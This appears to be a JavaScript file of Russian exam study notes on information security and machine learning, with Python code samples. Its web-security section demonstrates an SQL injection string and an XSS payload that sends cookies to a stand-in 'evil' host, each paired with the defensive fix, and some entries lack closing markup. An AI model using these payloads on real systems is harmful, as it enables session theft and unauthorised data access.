    return 9 &lt;= env['hour'] &lt; 19 and env['trusted_device']

user = {'id': 7, 'dept': 'risk', 'clearance': 2}
doc  = {'owner': 3, 'dept': 'risk', 'level': 3}
print(pdp(user, doc, 'read',  {'hour': 12, 'trusted_device': True}))   # True
print(pdp(user, doc, 'write', {'hour': 12, 'trusted_device': True}))   # False

# --- PEP в веб-приложении (FastAPI) ---
from fastapi import FastAPI, Depends, HTTPException
app = FastAPI()

def require(perm):
    def dep(user=Depends(lambda: {'roles': ['analyst']})):
        if not can(user['roles'], perm):
            raise HTTPException(403, "Доступ запрещён")     # deny by default
        return user
    return dep

@app.post("/reports/{rid}/approve")
def approve(rid: int, user=Depends(require('report:approve'))):
    return {"ok": True}</code></pre>
`});

T.push({b:1,n:7,t:"Модель нарушителя при защите АС от несанкционированного доступа",

h:`
<h3>Назначение модели</h3>
<div class="def"><b>Модель нарушителя</b> — абстрактное описание категорий лиц, способных совершить несанкционированный доступ, с указанием их мотивации, возможностей, оснащённости и предполагаемых способов действий.</div>
<p>Модель нарушителя — обязательная часть модели угроз. От неё напрямую зависят: перечень актуальных угроз, требуемый класс защищённости системы, класс применяемых СКЗИ (КС1 — КА1) и состав мер защиты. Ошибка в модели нарушителя обесценивает всю систему защиты: либо она избыточно дорога, либо не защищает от реального противника.</p>

<h3>Что описывается</h3>
<ul>
<li><b>Тип</b>: внешний или внутренний по отношению к контролируемой зоне.</li>
<li><b>Категория</b>: физическое лицо, конкурент, криминальная группа, террористическая организация, спецслужба иностранного государства, разработчик или поставщик ПО и оборудования, обслуживающий персонал, администратор.</li>
<li><b>Мотивация</b>: корысть, любопытство и самоутверждение, месть (уволенный сотрудник), идеология и хактивизм, конкурентная разведка, государственный заказ, непреднамеренные действия (ошибка).</li>
<li><b>Возможности и оснащённость</b>: доступные знания о системе, наличие физического доступа, штатные и специально разработанные средства, ресурсы (время, финансирование, коллектив специалистов), возможность сговора.</li>
<li><b>Предполагаемые способы</b> реализации: НСД к носителям и терминалам, перехват в каналах связи, внедрение вредоносного ПО, эксплуатация уязвимостей, социальная инженерия, использование недекларированных возможностей.</li>
</ul>

<h3>Потенциал нарушителя</h3>
<table>
<tr><th>Потенциал</th><th>Возможности</th><th>Типичные представители</th></tr>
<tr><td><b>Базовый (низкий)</b></td><td>использует общедоступные инструменты и известные уязвимости, не имеет сведений о системе</td><td>внешний любитель, недобросовестный пользователь</td></tr>
<tr><td><b>Базовый повышенный (средний)</b></td><td>анализирует систему, может создавать инструменты, имеет частичные сведения об архитектуре</td><td>конкуренты, криминальные группы, администратор, разработчик</td></tr>
<tr><td><b>Высокий</b></td><td>ведёт научные исследования, внедряет закладки на этапе производства, обладает ресурсами государства, возможен сговор нескольких лиц</td><td>спецслужбы иностранных государств</td></tr>
</table>
<p>Типовая шкала внутренних нарушителей по уровню полномочий: от пользователя, работающего с системой в рамках штатных функций (Н1), через администраторов приложений и баз данных, до системного администратора и администратора безопасности с максимальными правами и возможностью изменять настройки самих средств защиты.</p>
<div class="note"><b>Практические выводы.</b> Наиболее опасен внутренний нарушитель с легитимным доступом: его действия внешне выглядят штатными. Отсюда обязательность разделения обязанностей, контроля действий привилегированных пользователей (PAM), защиты журналов аудита от изменения администратором, принципа минимума привилегий и процедур увольнения с немедленным отзывом прав.</div>
`});

T.push({b:1,n:8,t:"Программно-аппаратные средства защиты от НСД",

h:`
<h3>Состав функций СЗИ от НСД</h3>
<p>Средство защиты от несанкционированного доступа реализует замкнутый набор механизмов, дополняющих штатные средства операционной системы:</p>
<ul>

<li><b>Дискреционное и мандатное разграничение доступа</b> к файлам, устройствам, сети, принтерам.</li>
<li><b>Доверенная загрузка</b>: аппаратный модуль (АМДЗ) перехватывает управление до старта ОС, проверяет целостность загрузчика и ядра, блокирует загрузку с внешних носителей.</li>

<li><b>Гарантированное затирание</b> остаточной информации при удалении файлов и освобождении памяти.</li>
<li><b>Регистрация и аудит</b> событий безопасности с защитой журналов от модификации.</li>

<h3>Классификация средств</h3>
<table>
<tr><th>Класс</th><th>Примеры</th><th>Назначение</th></tr>

<tr><td>Аппаратно-программные модули доверенной загрузки</td><td>«Аккорд-АМДЗ», «Соболь», «Криптон-Замок»</td><td>контроль до старта ОС, аппаратный корень доверия</td></tr>
<tr><td>Криптографические носители и токены</td><td>Рутокен, JaCarta, eToken</td><td>хранение ключей и сертификатов, двухфакторная аутентификация</td></tr>
<tr><td>HSM и криптоускорители</td><td>аппаратные модули безопасности</td><td>генерация и неизвлекаемое хранение ключей, подпись</td></tr>
<tr><td>TPM</td><td>модуль на материнской плате</td><td>измерение целостности загрузки, привязка ключей к платформе, BitLocker</td></tr>
<tr><td>Средства защиты сети</td><td>межсетевые экраны, СОВ/IDS, VPN-шлюзы (ViPNet, «Континент»)</td><td>сегментация и контроль трафика</td></tr>
<tr><td>Специализированные</td><td>DLP, PAM, SIEM, средства контроля съёмных носителей</td><td>предотвращение утечек, контроль привилегий, мониторинг</td></tr>
</table>

<h3>Особенности применения</h3>
<p>Для государственных информационных систем и систем персональных данных требуются средства, <b>сертифицированные ФСТЭК России</b> по соответствующему классу защиты и уровню контроля отсутствия недекларированных возможностей; криптографические средства — сертифицированные ФСБ России. Класс определяется по категории обрабатываемой информации, масштабу системы и модели нарушителя.</p>
<div class="note"><b>Принцип эшелонирования (defense in depth).</b> Ни одно средство не является достаточным. Схема многослойной защиты: физический контроль помещения → доверенная загрузка → аутентификация → разграничение доступа → шифрование данных → контроль устройств и каналов → регистрация событий и мониторинг в SIEM → резервное копирование как последний рубеж.</div>

<h3>Код</h3>
<pre><code>import hashlib, json, os
from pathlib import Path

# Простейший контроль целостности - базовая функция любого СЗИ от НСД
def sha256(path, chunk=1 &lt;&lt; 20):
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        for block in iter(lambda: f.read(chunk), b''):
            h.update(block)
    return h.hexdigest()

def make_baseline(root, out='baseline.json'):
    base = {str(p): sha256(p) for p in Path(root).rglob('*') if p.is_file()}
    Path(out).write_text(json.dumps(base, indent=2))
    return base

def check(root, baseline='baseline.json'):
    base = json.loads(Path(baseline).read_text())
    now = {str(p): sha256(p) for p in Path(root).rglob('*') if p.is_file()}
    changed = [f for f in base if f in now and base[f] != now[f]]
    deleted = [f for f in base if f not in now]
    added   = [f for f in now if f not in base]
    return {'изменены': changed, 'удалены': deleted, 'добавлены': added}

# make_baseline('/etc/app')
# print(check('/etc/app'))   -> сигнал в журнал аудита при расхождении</code></pre>

T.push({b:1,n:9,t:"Антивирусная защита. Организационно-правовые меры",
s:"ФЗ-149, приказы ФСТЭК, ISO/IEC 27002",
h:`
<h3>Вредоносное программное обеспечение</h3>
<p>Виды: вирусы (внедряются в файлы), черви (самораспространение по сети), трояны, программы-вымогатели (шифровальщики), шпионское ПО и кейлогеры, руткиты (сокрытие присутствия), ботнеты, бесфайловые угрозы (живут в оперативной памяти и в легитимных утилитах), майнеры, рекламное ПО.</p>

<h3>Методы обнаружения</h3>
<table>
<tr><th>Метод</th><th>Принцип</th><th>Ограничения</th></tr>
<tr><td><b>Сигнатурный</b></td><td>сравнение с базой известных образцов</td><td>бессилен против новых и полиморфных угроз, требует постоянного обновления баз</td></tr>
<tr><td><b>Эвристический</b></td><td>анализ подозрительных конструкций кода и структуры файла</td><td>ложные срабатывания</td></tr>
<tr><td><b>Поведенческий</b> (HIPS)</td><td>мониторинг действий процесса в системе в реальном времени</td><td>реакция уже после начала активности</td></tr>
<tr><td><b>Песочница</b> (sandbox)</td><td>запуск в изолированной среде и наблюдение</td><td>вредонос может распознать виртуальную среду и «уснуть»</td></tr>
<tr><td><b>Репутационный и облачный</b></td><td>оценка распространённости и происхождения файла</td><td>нужна связь с облаком поставщика</td></tr>
<tr><td><b>Машинное обучение</b></td><td>классификация по признакам файла и поведения</td><td>уязвимость к состязательным примерам</td></tr>
</table>
<p><b>Средства:</b> антивирус на рабочих станциях и серверах, шлюзовые решения для почты и веб-трафика, EDR/XDR (обнаружение и реагирование на конечных точках с телеметрией и возможностью изоляции хоста), песочницы, контроль запуска приложений (whitelisting).</p>
<p><b>Организационная часть:</b> регулярное обновление ПО и баз, регламент реагирования на инцидент (обнаружение → изоляция → устранение → восстановление → анализ причин), резервное копирование по правилу 3-2-1 (три копии, два носителя, одна вне площадки) — главная защита от шифровальщиков, обучение персонала распознаванию фишинга.</p>

<h3>Организационно-правовые меры</h3>
<ul>
<li><b>Правовые:</b> федеральные законы (149-ФЗ, 152-ФЗ о персональных данных, 63-ФЗ об электронной подписи, 98-ФЗ о коммерческой тайне, 187-ФЗ о безопасности КИИ), подзаконные акты ФСТЭК и ФСБ, ответственность по статьям 272–274 УК РФ (неправомерный доступ, создание вредоносных программ, нарушение правил эксплуатации).</li>
<li><b>Организационные:</b> политика ИБ и частные регламенты, приказ о режиме коммерческой тайны и перечень сведений, разграничение полномочий, соглашения о неразглашении, инструктаж и обучение, пропускной и внутриобъектовый режим, порядок работы с носителями, аттестация объектов информатизации, аудит и проверки.</li>
<li><b>Кадровые:</b> проверка при приёме, разделение обязанностей, процедура увольнения с немедленным отзывом доступов, контроль подрядчиков.</li>
</ul>
<div class="note">Технические меры без организационных неэффективны: пароль на стикере, сотрудник, открывший вложение из письма, или подрядчик с бессрочным VPN-доступом обходят любую дорогостоящую систему защиты. По статистике человеческий фактор остаётся причиной большинства инцидентов.</div>
`});

T.push({b:1,n:10,t:"Системный и комплексный подход к защите информации. Объект защиты",
s:"Теория защиты информации",
h:`
<h3>Объект защиты</h3>
<div class="def"><b>Объект защиты</b> — информация, носитель информации или информационный процесс, в отношении которых необходимо обеспечивать защиту в соответствии с поставленной целью.</div>
<p>Состав объектов защиты:</p>
<ul>
<li><b>Информационные активы:</b> сведения ограниченного доступа (гостайна, коммерческая тайна, персональные данные), базы данных, документы, резервные копии.</li>
<li><b>Носители:</b> диски, съёмные накопители, бумажные документы, физические поля (акустические, электромагнитные).</li>
<li><b>Инфраструктура:</b> серверы, рабочие станции, сетевое оборудование, каналы связи, ПО, средства обработки.</li>
<li><b>Помещения</b> и выделенные зоны, инженерные системы (электропитание, кондиционирование).</li>
<li><b>Персонал</b> — одновременно и субъект защиты, и объект воздействия (социальная инженерия, вербовка).</li>
</ul>
<p>Первый практический шаг — <b>инвентаризация и категорирование активов</b>: нельзя защитить то, о существовании чего неизвестно.</p>

<h3>Комплексный подход</h3>
<p>Отвечает на вопрос <b>«чем защищать»</b>: требует применения <b>всей совокупности видов и средств</b> защиты — правовых, организационных, инженерно-технических, программно-аппаратных, криптографических, физических — по всем возможным каналам утечки и на всех этапах обработки информации. Это <b>полнота охвата</b>: закрыть все направления, не оставив «дыр».</p>

<h3>Системный подход</h3>
<p>Отвечает на вопрос <b>«как строить»</b>: рассматривает защиту как <b>единую систему</b> взаимосвязанных элементов, обладающую собственными целями, структурой, входами и выходами, обратной связью и жизненным циклом. Ключевые черты:</p>
<ul>
<li>наличие цели и критериев эффективности, декомпозиция цели на подзадачи;</li>
<li>учёт <b>взаимосвязей</b> элементов и эмерджентности: свойства системы не сводятся к сумме свойств средств защиты;</li>
<li>анализ внешней среды (угрозы, законодательство, бизнес-процессы);</li>
<li>непрерывность и адаптивность: мониторинг, обратная связь, совершенствование (цикл PDCA);</li>
<li>оптимизация по критерию «эффективность — стоимость», а не максимизация защищённости любой ценой.</li>
</ul>

<h3>Различие подходов</h3>
<table>
<tr><th>Критерий</th><th>Комплексный</th><th>Системный</th></tr>
<tr><td>Основной вопрос</td><td>чем и от чего защищать</td><td>как организовать защиту как целое</td></tr>
<tr><td>Акцент</td><td>полнота набора средств и мер</td><td>взаимосвязи, структура, цели, управление</td></tr>
<tr><td>Характер</td><td>перечисление и охват направлений</td><td>методология анализа и проектирования</td></tr>
<tr><td>Время</td><td>преимущественно статический срез</td><td>жизненный цикл, развитие, обратная связь</td></tr>
<tr><td>Риск при изоляции</td><td>набор средств без согласования, «зоопарк» решений</td><td>стройная модель, но возможен пропуск канала утечки</td></tr>
</table>
<div class="note"><b>Вывод.</b> Понятия не противоположны, а дополняют друг друга: системный подход шире и включает комплексность как одно из требований. Практическая формулировка — <b>система комплексной защиты информации (СКЗИ как система)</b>: полный набор согласованных мер, объединённых единой целью, управлением и обратной связью, сопровождаемый на всём жизненном цикле объекта защиты.</div>
`});

T.push({b:1,n:11,t:"Управление информационной безопасностью",
s:"ISO/IEC 27001, ГОСТ Р ИСО/МЭК 27001, NIST CSF",
h:`
<h3>Система менеджмента ИБ</h3>
<div class="def"><b>СМИБ (ISMS)</b> — часть общей системы управления организации, основанная на анализе рисков и предназначенная для создания, реализации, эксплуатации, мониторинга, анализа, поддержки и совершенствования информационной безопасности.</div>
<p>Стандарт ISO/IEC 27001 задаёт требования к СМИБ и подлежит сертификации; ISO/IEC 27002 содержит свод практик по мерам защиты; ISO/IEC 27005 — управление рисками. Альтернативные рамки: NIST Cybersecurity Framework (функции Identify, Protect, Detect, Respond, Recover), COBIT для ИТ-управления.</p>

<h3>Цикл PDCA</h3>
<table>
<tr><th>Этап</th><th>Содержание</th></tr>
<tr><td><b>Plan</b> — планирование</td><td>определение области действия, политики ИБ, инвентаризация активов, оценка и обработка рисков, выбор мер, декларация о применимости</td></tr>
<tr><td><b>Do</b> — реализация</td><td>внедрение мер и процессов, распределение ролей и ответственности, обучение персонала</td></tr>
<tr><td><b>Check</b> — контроль</td><td>мониторинг, сбор метрик, внутренние аудиты, тестирование на проникновение, анализ инцидентов</td></tr>
<tr><td><b>Act</b> — совершенствование</td><td>корректирующие действия, пересмотр рисков и политик, анализ со стороны руководства</td></tr>
</table>

<h3>Ключевые процессы управления</h3>
<ul>
<li><b>Управление рисками</b> — ядро СМИБ: идентификация, анализ, оценивание, обработка (снизить, передать, принять, избежать), мониторинг остаточного риска.</li>
<li><b>Управление активами</b> — инвентаризация, владельцы, категорирование, правила обращения.</li>
<li><b>Управление доступом</b> — предоставление, изменение и отзыв прав, регулярный пересмотр (ревизия прав), контроль привилегированных учётных записей.</li>
<li><b>Управление уязвимостями</b> — сканирование, приоритизация по CVSS и контексту, установка обновлений, контроль устранения.</li>
<li><b>Управление инцидентами</b> — обнаружение, регистрация, классификация, реагирование, восстановление, расследование, извлечённые уроки; взаимодействие с ГосСОПКА для субъектов КИИ.</li>
<li><b>Управление непрерывностью</b> — планы BCP/DRP, целевые показатели RTO (допустимое время восстановления) и RPO (допустимая потеря данных), резервное копирование и учения.</li>
<li><b>Управление изменениями и поставщиками</b>, повышение осведомлённости персонала.</li>
</ul>

<h3>Роль и место в современной системе защиты</h3>
<p>Технические средства реализуют защиту, а процессы управления обеспечивают её <b>адекватность, непрерывность и измеримость</b>. Без управления защита деградирует: правила устаревают, права накапливаются, обновления не ставятся, срабатывания средств никто не разбирает.</p>
<p><b>Организационная структура:</b> ответственность верхнего уровня несёт руководство (утверждение политики, выделение ресурсов); операционное управление — CISO и подразделение ИБ; мониторинг — <b>SOC</b> (центр мониторинга) на базе <b>SIEM</b> (сбор и корреляция событий), SOAR (автоматизация реагирования), систем анализа поведения (UEBA), threat intelligence.</p>
<p><b>Метрики эффективности:</b> MTTD (среднее время обнаружения), MTTR (среднее время реагирования и восстановления), доля закрытых критических уязвимостей в срок, доля сотрудников, прошедших обучение, результаты учебных фишинговых рассылок, число инцидентов и величина ущерба.</p>
<div class="note"><b>Главный принцип.</b> Безопасность — не разовый проект, а <b>непрерывный процесс</b>: угрозы, инфраструктура и бизнес меняются, поэтому оценка рисков и меры защиты подлежат регулярному пересмотру.</div>
`});

T.push({b:1,n:13,t:"Уязвимости, угрозы и средства защиты в Интернете",

<h3>Типовые уязвимости веб-приложений (OWASP Top 10)</h3>
<table>

<tr><td><b>XSS</b></td><td>внедрение скрипта в страницу, кража сессии</td><td>экранирование вывода, Content-Security-Policy, флаги HttpOnly и Secure у cookie</td></tr>
<tr><td><b>CSRF</b></td><td>выполнение действия от имени авторизованного пользователя</td><td>анти-CSRF токены, SameSite=Strict/Lax, проверка Origin</td></tr>

<tr><td><b>Нарушение контроля доступа</b></td><td>прямые ссылки на чужие объекты (IDOR), обход проверок</td><td>проверка прав на сервере для каждого объекта, deny by default</td></tr>
<tr><td>Небезопасная конфигурация</td><td>дефолтные пароли, открытые панели, подробные ошибки</td><td>харденинг, отключение отладки и документации API в проде</td></tr>
<tr><td>Уязвимые компоненты</td><td>устаревшие библиотеки с известными CVE</td><td>SCA-сканеры, SBOM, регулярное обновление</td></tr>
<tr><td>Ошибки криптографии</td><td>слабые алгоритмы, хранение паролей в открытом виде</td><td>TLS, argon2/bcrypt, проверенные библиотеки</td></tr>
</table>

<h3>Сетевые угрозы</h3>
<p><b>DDoS</b> (объёмные, на уровне протокола, на уровне приложения) — защита фильтрацией трафика, CDN, ограничением частоты запросов, anycast. <b>MITM</b> и перехват трафика — TLS с проверкой сертификата, HSTS, закрепление ключей. <b>Спуфинг ARP/DNS, отравление кэша DNS</b> — DNSSEC, DoH/DoT, сегментация. <b>Сканирование и перебор</b> — межсетевые экраны, fail2ban, ограничение попыток. <b>Фишинг и социальная инженерия</b> — почтовая фильтрация, SPF/DKIM/DMARC, обучение персонала. <b>Ботнеты, шифровальщики, утечки через открытые облачные хранилища</b>.</p>

<h3>Средства защиты</h3>
<ul>
<li><b>Каналы:</b> TLS 1.3, VPN (IPsec, WireGuard, отечественные ViPNet и «Континент»), сегментация сети и VLAN.</li>
<li><b>Периметр и приложения:</b> межсетевой экран, NGFW, WAF, обратный прокси, антибот, ограничение частоты запросов.</li>
<li><b>Мониторинг:</b> IDS/IPS, SIEM, анализ журналов, honeypot, threat intelligence.</li>
<li><b>Процессы разработки:</b> SAST, DAST, SCA, тестирование на проникновение, программы поиска уязвимостей (bug bounty), безопасные заголовки ответов.</li>
<li><b>Управление уязвимостями:</b> идентификаторы CVE, оценка критичности CVSS (0–10), БДУ ФСТЭК, приоритизация по эксплуатируемости.</li>

<h3>Код</h3>
<pre><code>import sqlite3, html, secrets

# 1) SQL-инъекция: неправильно и правильно
db = sqlite3.connect(':memory:'); cur = db.cursor()
cur.execute("CREATE TABLE users(id INT, login TEXT, role TEXT)")
cur.execute("INSERT INTO users VALUES (1, 'admin', 'admin')")

evil = "x' OR '1'='1"
# ПЛОХО: конкатенация -> запрос вернёт все строки
cur.execute("SELECT * FROM users WHERE login = '" + evil + "'")
print('уязвимо:', cur.fetchall())
# ХОРОШО: параметризация - данные не смешиваются с кодом запроса
cur.execute("SELECT * FROM users WHERE login = ?", (evil,))
print('безопасно:', cur.fetchall())

# 2) XSS: экранирование вывода
comment = '&lt;script&gt;fetch("//evil/"+document.cookie)&lt;/script&gt;'
print(html.escape(comment))

# 3) CSRF-токен
token = secrets.token_urlsafe(32)          # кладём в сессию и в форму
def check_csrf(session_token, form_token):
    return secrets.compare_digest(session_token, form_token)
print(check_csrf(token, token))</code></pre>
<pre><code># Безопасные заголовки ответа (FastAPI middleware)
from fastapi import FastAPI
app = FastAPI(docs_url=None)               # документация отключена в проде

@app.middleware("http")
async def secure_headers(request, call_next):
    r = await call_next(request)
    r.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    r.headers["Content-Security-Policy"]   = "default-src 'self'"
    r.headers["X-Content-Type-Options"]    = "nosniff"
    r.headers["X-Frame-Options"]           = "DENY"

T.push({b:2,n:14,t:"Машинное обучение: основные понятия, классификация задач",
s:"Основы машинного обучения",
h:`
<h3>Основные понятия</h3>
<div class="def"><b>Машинное обучение</b> — раздел искусственного интеллекта, изучающий алгоритмы, которые улучшают своё качество на некоторой задаче по мере накопления опыта (данных), без явного программирования правил.</div>
<p>Классическая формулировка Т. Митчелла: программа обучается на опыте <b>E</b> относительно задачи <b>T</b> с мерой качества <b>P</b>, если качество решения T, измеренное по P, растёт с накоплением E.</p>
<ul>
<li><b>Объект</b> (наблюдение, sample) и <b>признаки</b> (features) — вектор x; <b>целевая переменная</b> y (метка, target).</li>
<li><b>Обучающая выборка</b> — набор пар (x, y); <b>модель</b> — параметрическое семейство функций a(x, θ); <b>обучение</b> — подбор параметров θ.</li>
<li><b>Функция потерь</b> L(a(x), y) и <b>эмпирический риск</b> — её среднее по выборке; обучение = минимизация риска.</li>
<li><b>Гиперпараметры</b> задаются до обучения (глубина дерева, шаг обучения), <b>параметры</b> подбираются в ходе обучения.</li>
<li><b>Обобщающая способность</b> — качество на новых данных; <b>переобучение</b> (модель запомнила шум обучающей выборки) и <b>недообучение</b> (модель слишком проста).</li>
</ul>
<div class="thm"><b>Компромисс смещения и разброса.</b> Ошибка = смещение² + разброс + неустранимый шум. Простые модели дают большое смещение, сложные — большой разброс. Средства управления: регуляризация, ограничение сложности, увеличение выборки, ансамблирование.</div>

<h3>Классификация задач</h3>
<table>
<tr><th>Парадигма</th><th>Данные</th><th>Задачи</th><th>Примеры алгоритмов</th></tr>
<tr><td><b>С учителем</b> (supervised)</td><td>размеченные (x, y)</td><td>классификация, регрессия, ранжирование</td><td>линейная и логистическая регрессия, деревья, бустинг, SVM, нейросети</td></tr>
<tr><td><b>Без учителя</b> (unsupervised)</td><td>только x</td><td>кластеризация, снижение размерности, поиск аномалий, ассоциативные правила</td><td>k-средних, DBSCAN, PCA, t-SNE, изолирующий лес, Apriori</td></tr>
<tr><td>Частичное привлечение учителя</td><td>малая размеченная часть + много неразмеченных</td><td>классификация при дорогой разметке</td><td>псевдоразметка, self-training</td></tr>
<tr><td>Самообучение (self-supervised)</td><td>метка порождается из самих данных</td><td>предобучение представлений</td><td>языковые модели, контрастное обучение</td></tr>
<tr><td>С подкреплением (RL)</td><td>взаимодействие со средой, награда</td><td>управление, игры, робототехника</td><td>Q-обучение, policy gradient</td></tr>
</table>

<h3>Различие обучения с учителем и без</h3>
<p><b>С учителем:</b> есть «правильные ответы», цель — приблизить неизвестную зависимость y = f(x); качество измеряется объективно на отложенной выборке. <b>Без учителя:</b> ответов нет, цель — обнаружить внутреннюю структуру данных; качество оценивается косвенно (внутренние метрики, экспертная интерпретация), результат неоднозначен. Разметка дорога, поэтому неразмеченных данных на практике на порядки больше.</p>

<h3>Код</h3>
<pre><code>from sklearn.datasets import load_breast_cancer
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.ensemble import RandomForestClassifier
from sklearn.cluster import KMeans
from sklearn.preprocessing import StandardScaler

X, y = load_breast_cancer(return_X_y=True)
Xtr, Xte, ytr, yte = train_test_split(X, y, test_size=0.25,
                                      stratify=y, random_state=42)

# обучение С УЧИТЕЛЕМ: есть метки y
clf = RandomForestClassifier(n_estimators=300, random_state=42).fit(Xtr, ytr)
print('accuracy на тесте:', round(clf.score(Xte, yte), 4))
print('кросс-валидация  :', cross_val_score(clf, X, y, cv=5).mean().round(4))

# обучение БЕЗ УЧИТЕЛЯ: метки не используются
Xs = StandardScaler().fit_transform(X)
km = KMeans(n_clusters=2, n_init=10, random_state=42).fit(Xs)
print('размеры кластеров:', [(km.labels_ == c).sum() for c in (0, 1)])

# переобучение: дерево без ограничений запоминает обучающую выборку
from sklearn.tree import DecisionTreeClassifier
deep = DecisionTreeClassifier(random_state=0).fit(Xtr, ytr)
shal = DecisionTreeClassifier(max_depth=3, random_state=0).fit(Xtr, ytr)
print('глубокое:', deep.score(Xtr, ytr), deep.score(Xte, yte))
print('обрезанное:', shal.score(Xtr, ytr), shal.score(Xte, yte))</code></pre>
`});

T.push({b:2,n:15,t:"Классификация и регрессия. Метрики качества",
s:"Метрики машинного обучения",
h:`
<h3>Постановки задач</h3>
<p><b>Классификация:</b> y принадлежит конечному множеству классов (бинарная, многоклассовая, многометочная). <b>Регрессия:</b> y — вещественное число. Общая схема одна: подбор параметров модели минимизацией функции потерь, различаются функции потерь и метрики.</p>

<h3>Матрица ошибок</h3>
<table>
<tr><th></th><th>Предсказан 1</th><th>Предсказан 0</th></tr>
<tr><td><b>Истинно 1</b></td><td>TP — истинно-положительный</td><td>FN — ошибка II рода (пропуск)</td></tr>
<tr><td><b>Истинно 0</b></td><td>FP — ошибка I рода (ложная тревога)</td><td>TN — истинно-отрицательный</td></tr>
</table>

<h3>Метрики классификации</h3>
<div class="f">Accuracy = (TP + TN) / (TP + TN + FP + FN)</div>
<div class="f">Precision = TP / (TP + FP)  — доля верных среди предсказанных положительными</div>
<div class="f">Recall (TPR, полнота) = TP / (TP + FN)  — доля найденных среди всех положительных</div>
<div class="f">F1 = 2·Precision·Recall / (Precision + Recall)  — гармоническое среднее</div>
<ul>
<li><b>Accuracy обманчива при дисбалансе классов:</b> при 1% мошеннических операций модель «всегда легитимно» даёт 99% точности и нулевую пользу.</li>
<li><b>Компромисс precision — recall</b> регулируется порогом. В медицинской диагностике важнее recall (не пропустить болезнь), в антиспаме — precision (не потерять важное письмо). F-бета смещает баланс.</li>
<li><b>ROC-AUC</b> — площадь под кривой TPR(FPR), не зависит от порога; 0.5 — случайное угадывание, 1.0 — идеал. При сильном дисбалансе информативнее <b>PR-AUC</b> (average precision).</li>
<li><b>Log Loss</b> — штрафует за уверенные ошибки, оценивает качество вероятностей; калибровка вероятностей проверяется калибровочной кривой и метрикой Брайера.</li>
<li>Многоклассовое усреднение: macro (равный вес классам), micro (равный вес объектам), weighted (по численности классов).</li>
</ul>

<h3>Метрики регрессии</h3>
<table>
<tr><th>Метрика</th><th>Формула</th><th>Свойства</th></tr>
<tr><td>MAE</td><td>(1/n)Σ|y − ŷ|</td><td>устойчива к выбросам, в единицах целевой переменной</td></tr>
<tr><td>MSE</td><td>(1/n)Σ(y − ŷ)²</td><td>сильно штрафует крупные ошибки, дифференцируема</td></tr>
<tr><td>RMSE</td><td>sqrt(MSE)</td><td>в единицах целевой переменной</td></tr>
<tr><td>MAPE</td><td>(100/n)Σ|y − ŷ|/|y|</td><td>относительная ошибка; неприменима при y близких к нулю</td></tr>
<tr><td>R²</td><td>1 − SS<sub>res</sub>/SS<sub>tot</sub></td><td>доля объяснённой дисперсии; 1 — идеал, 0 — уровень среднего, возможен отрицательный</td></tr>
</table>
<div class="note"><b>Правило выбора метрики.</b> Метрика должна отражать бизнес-цель, а не удобство оптимизации. Часто оптимизируют дифференцируемую функцию потерь (log loss, MSE), а решение принимают по бизнес-метрике (прибыль, стоимость ошибки, доля пойманного мошенничества при заданном уровне ложных срабатываний).</div>

<h3>Код</h3>
<pre><code>import numpy as np
from sklearn.datasets import make_classification
from sklearn.model_selection import train_test_split
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import (confusion_matrix, classification_report,
                             roc_auc_score, average_precision_score,
                             precision_recall_curve, log_loss)

X, y = make_classification(n_samples=5000, weights=[0.97, 0.03],
                           n_informative=6, random_state=0)   # сильный дисбаланс
Xtr, Xte, ytr, yte = train_test_split(X, y, stratify=y, random_state=0)

m = LogisticRegression(max_iter=1000, class_weight='balanced').fit(Xtr, ytr)
proba = m.predict_proba(Xte)[:, 1]
pred = (proba &gt;= 0.5).astype(int)

print(confusion_matrix(yte, pred))
print(classification_report(yte, pred, digits=3))
print('ROC-AUC :', round(roc_auc_score(yte, proba), 4))
print('PR-AUC  :', round(average_precision_score(yte, proba), 4))
print('LogLoss :', round(log_loss(yte, proba), 4))
print('доля класса 1 =', yte.mean(), '-> accuracy сама по себе бесполезна')

# подбор порога под бизнес-требование: recall не ниже 0.8
p, r, th = precision_recall_curve(yte, proba)
i = np.argmax(r[:-1] &lt; 0.8) - 1
print('порог:', round(th[i], 3), 'precision:', round(p[i], 3), 'recall:', round(r[i], 3))

# регрессия
from sklearn.metrics import mean_absolute_error, mean_squared_error, r2_score
yt = np.array([10., 20., 30., 40.]); yp = np.array([12., 18., 33., 39.])
print(mean_absolute_error(yt, yp), mean_squared_error(yt, yp) ** 0.5, r2_score(yt, yp))</code></pre>

<h3>Дерево решений</h3>
<p>Иерархическая структура: во внутренних узлах — предикаты вида «признак ≤ порог», в листьях — ответ (класс или число). Прогноз — спуск от корня к листу.</p>
<p><b>Обучение — жадный рекурсивный алгоритм:</b> в каждом узле перебираются признаки и пороги, выбирается разбиение с максимальным <b>приростом информации</b> (уменьшением неоднородности), затем процедура повторяется для потомков.</p>
<div class="f">Gain = H(родитель) − Σ (n<sub>k</sub>/n)·H(потомок<sub>k</sub>)</div>
<table>
<tr><th>Критерий</th><th>Формула</th><th>Задача</th></tr>
<tr><td>Энтропия</td><td>−Σ p<sub>i</sub>·log₂p<sub>i</sub></td><td>классификация (ID3, C4.5)</td></tr>
<tr><td>Индекс Джини</td><td>1 − Σ p<sub>i</sub>²</td><td>классификация (CART), быстрее вычисляется</td></tr>
<tr><td>Дисперсия / MSE</td><td>(1/n)Σ(y − ȳ)²</td><td>регрессия</td></tr>
</table>
<p><b>Критерии остановки:</b> максимальная глубина, минимальное число объектов в листе и для разбиения, минимальный прирост. <b>Обрезка (pruning)</b> — удаление ветвей, не улучшающих качество на валидации (cost-complexity pruning).</p>
<p><b>Достоинства:</b> интерпретируемость, работа с разнотипными и немасштабированными признаками, устойчивость к монотонным преобразованиям, автоматический учёт взаимодействий. <b>Недостатки:</b> сильное переобучение, неустойчивость (малое изменение данных меняет структуру), кусочно-постоянный прогноз, невозможность экстраполяции.</p>

<h3>Ансамбли</h3>
<p>Идея: композиция многих слабых моделей даёт качество выше, чем у любой из них, за счёт снижения разброса или смещения.</p>
<table>
<tr><th>Подход</th><th>Как строится</th><th>Что снижает</th><th>Примеры</th></tr>
<tr><td><b>Бэггинг</b></td><td>независимые модели на бутстрап-подвыборках, ответ усредняется</td><td>разброс (variance)</td><td>Bagging, <b>случайный лес</b></td></tr>
<tr><td><b>Бустинг</b></td><td>модели строятся последовательно, каждая исправляет ошибки предыдущих</td><td>смещение (bias)</td><td>AdaBoost, GBM, XGBoost, LightGBM, CatBoost</td></tr>
